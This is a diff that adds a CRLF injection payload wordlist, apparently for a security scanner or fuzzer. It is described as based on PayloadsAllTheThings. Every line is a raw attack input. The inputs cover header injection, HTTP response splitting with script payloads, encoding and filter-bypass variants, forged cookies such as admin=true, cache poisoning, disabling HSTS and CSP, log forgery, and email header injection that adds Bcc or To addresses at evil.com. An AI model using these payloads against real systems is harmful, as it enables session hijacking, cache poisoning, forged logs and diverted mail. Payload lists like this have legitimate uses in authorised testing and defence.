@@ -1,0 +1,94 @@
+# CRLF Injection Payloads - Based on PayloadsAllTheThings
+
+# Basic CRLF
+%0d%0a
+%0d%0aSet-Cookie:crlf=injection
+%0d%0aX-Injected:header
+%0aSet-Cookie:crlf=injection
+%0dSet-Cookie:crlf=injection
+\r\nSet-Cookie:crlf=injection
+
+# Header Injection
+%0d%0aLocation:https://evil.com
+%0d%0aContent-Type:text/html
+%0d%0aContent-Length:0
+%0d%0aX-XSS-Protection:0
+%0d%0aAccess-Control-Allow-Origin:*
+%0d%0aX-Frame-Options:ALLOW
+%0d%0aCache-Control:no-cache
+%0d%0aX-Forwarded-For:127.0.0.1
+
+# HTTP Response Splitting
+%0d%0a%0d%0a<html><script>alert(1)</script></html>
+%0d%0a%0d%0a{"injected":"json"}
+%0d%0a%0d%0a<img src=x onerror=alert(1)>
+
+# Double Encoding
+%250d%250a
+%25%30%64%25%30%61
+%250d%250aSet-Cookie:crlf=injection
+
+# Unicode
+%u000d%u000a
+%E5%98%8A%E5%98%8D
+%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection
+
+# Mixed Encoding
+%0d%0a%20
+%0d%0a%09
+%0d%20%0a
+%20%0d%0a
+%09%0d%0a
+
+# Null Byte
+%00%0d%0a
+%0d%00%0a
+%0d%0a%00
+
+# Multiple CRLF
+%0d%0a%0d%0a
+%0a%0d%0a%0d
+%0d%0a%0d%0a%0d%0a
+
+# URL Encoded Variations
+%0D%0A
+%0d%0A
+%0D%0a
+%0a%0d
+%0A%0D
+
+# Tab and Space
+%09%0d%0a
+%20%0d%0a
+%0d%09%0a
+%0d%20%0a
+
+# Bypass Filters
+%E5%98%8A%E5%98%8D
+%c0%8d%c0%8a
+%c4%8d%c4%8a
+
+# Cookie Injection
+%0d%0aSet-Cookie:admin=true
+%0d%0aSet-Cookie:session=malicious
+%0d%0aSet-Cookie:auth=bypass;HttpOnly;Secure
+
+# Cache Poisoning
+%0d%0aX-Cache:HIT
+%0d%0aAge:0
+%0d%0aCache-Control:public
+
+# Security Header Bypass
+%0d%0aX-Content-Type-Options:nosniff
+%0d%0aStrict-Transport-Security:max-age=0
+%0d%0aContent-Security-Policy:default-src *
+
+# Log Injection
+%0d%0a[CRITICAL] Injected log entry
+%0d%0a127.0.0.1 - - [01/Jan/2024:00:00:00] "GET /admin HTTP/1.1" 200
+
+# Email Header Injection
+%0d%0aBcc:attacker@evil.com
+%0d%0aCc:attacker@evil.com
+%0d%0aTo:attacker@evil.com
+%0d%0aSubject:Injected
